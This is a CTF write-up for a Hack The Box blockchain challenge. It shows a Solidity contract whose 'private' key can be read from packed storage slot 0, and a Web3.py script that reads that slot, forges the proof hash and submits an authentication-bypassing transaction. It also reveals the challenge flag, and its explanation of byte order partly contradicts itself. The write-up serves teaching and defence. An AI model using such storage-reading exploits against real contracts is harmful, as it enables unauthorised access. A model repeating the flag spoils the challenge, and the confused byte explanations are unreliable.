# HTB Operation Blackout - Enlistment

## Challenge Overview

**Challenge Name:** Enlistment  
**Category:** Blockchain / Smart Contract Security  
**Difficulty:** Easy  
**Flag:** `HTB{gg_wp_w3lc0me_t0_th3_t34m}`

Task Force Phoenix is mobilizing to counter the growing cyber threat of Operation Blackout. Applications are now open for enlistment for the Blockchain Security Unit. This challenge involves exploiting a vulnerability in a Solidity smart contract's authentication mechanism.

## Given Files

- `Enlistment.sol` - Main smart contract with vulnerable authentication
- `Setup.sol` - Contract setup and verification logic

## Technical Analysis

### Smart Contract Vulnerability Assessment

#### Enlistment.sol Analysis
```solidity
contract Enlistment {
    bytes16 public publicKey;
    bytes16 private privateKey;
    mapping(address => bool) public enlisted;
    
    constructor(bytes32 _key) {
        publicKey = bytes16(_key);
        privateKey = bytes16(_key << (16*8));
    }

    function enlist(bytes32 _proofHash) public {
        bool authorized = _proofHash == keccak256(abi.encodePacked(publicKey, privateKey));
        require(authorized, "Invalid proof hash");
        enlisted[msg.sender] = true;
    }
}
```

### Vulnerability Identification

1. **Public Key Exposure:** The `publicKey` variable is marked as `public`, making it readable by anyone
2. **Predictable Private Key:** The private key is derived from the same input as the public key:
   - `publicKey = bytes16(_key)` - Takes the lower 16 bytes of `_key`
   - `privateKey = bytes16(_key << (16*8))` - Takes the upper 16 bytes of `_key` shifted down
3. **Weak Authentication:** The `enlist` function only verifies a hash match without proper key validation

## Attack Chain

### 1. Solidity Storage Layout Analysis
**Critical Insight:** Multiple small variables are packed into single storage slots:
```solidity
bytes16 public publicKey;    // Stored in slot 0, lower 16 bytes
bytes16 private privateKey;  // Stored in slot 0, upper 16 bytes
```
Both variables are packed into storage slot 0, making the private key accessible.

### 2. Storage Reading Exploitation
```python
#!/usr/bin/env python3
from web3 import Web3

def solve_ctf():
    # Connect to blockchain
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    
    # Get target contract address
    setup_contract = w3.eth.contract(address=SETUP_ADDRESS, abi=SETUP_ABI)
    target_address = setup_contract.functions.TARGET().call()
    
    # Create contract instance
    enlistment_contract = w3.eth.contract(address=target_address, abi=ENLISTMENT_ABI)
    
    # KEY INSIGHT: Read storage slot 0 which contains both packed variables
    slot0 = w3.eth.get_storage_at(target_address, 0)
    public_key = slot0[16:]  # Lower 16 bytes (publicKey)
    private_key = slot0[:16]  # Upper 16 bytes (privateKey)
    
    # Calculate the proof hash that the contract expects
    proof_hash = w3.keccak(public_key + private_key)
    
    # Submit the proof to enlist
    enlist_txn = enlistment_contract.functions.enlist(proof_hash).build_transaction({
        'from': player_address,
        'nonce': nonce,
        'gasPrice': gas_price,
        'gas': gas_estimate + 10000
    })
    
    signed_txn = w3.eth.account.sign_transaction(enlist_txn, PRIVATE_KEY)
    tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
```

### 3. Authentication Bypass
The exploit reconstructs the expected proof hash by:
1. Reading the storage slot containing both public and private keys
2. Extracting the keys from their packed positions
3. Computing `keccak256(abi.encodePacked(publicKey, privateKey))`
4. Submitting the proof to bypass authentication

## Key Technical Concepts

### Solidity Storage Layout
- Multiple small variables can be packed into single storage slots for gas optimization
- `bytes16` + `bytes16` = 32 bytes = 1 storage slot
- Understanding storage layout is crucial for reading contract state

### Bit Shift Operations
The line `privateKey = bytes16(_key << (16*8))` performs:
- Left shift by 128 bits (16 * 8)
- Moves upper 16 bytes of `_key` to lower position
- `bytes16()` takes only the lower 16 bytes of the result

### Blockchain State Visibility
- All contract storage is visible on the blockchain
- "Private" variables are only private in Solidity visibility, not blockchain visibility
- Attackers can read all contract storage directly

## Mitigation Recommendations

### Smart Contract Security
- Never derive secrets from publicly accessible information
- Don't rely on "private" variables for security-critical data
- Use proper cryptographic authentication mechanisms
- Implement secure key management practices

### Authentication Design
- Use proper digital signature verification instead of hash comparison
- Implement nonce-based authentication to prevent replay attacks
- Store sensitive data off-chain when possible
- Use proven cryptographic libraries and patterns

### Development Practices
- Conduct thorough security audits before deployment
- Test contract storage layout and accessibility
- Follow established smart contract security guidelines
- Implement proper access controls and validation

## Tools Used

- Web3.py for blockchain interaction and smart contract communication
- Python for exploit script development
- Ethereum JSON-RPC for direct storage access
- Solidity for smart contract analysis

## Write-Up Credit: [binchickens69](https://ctf.hackthebox.com/user/profile/605069)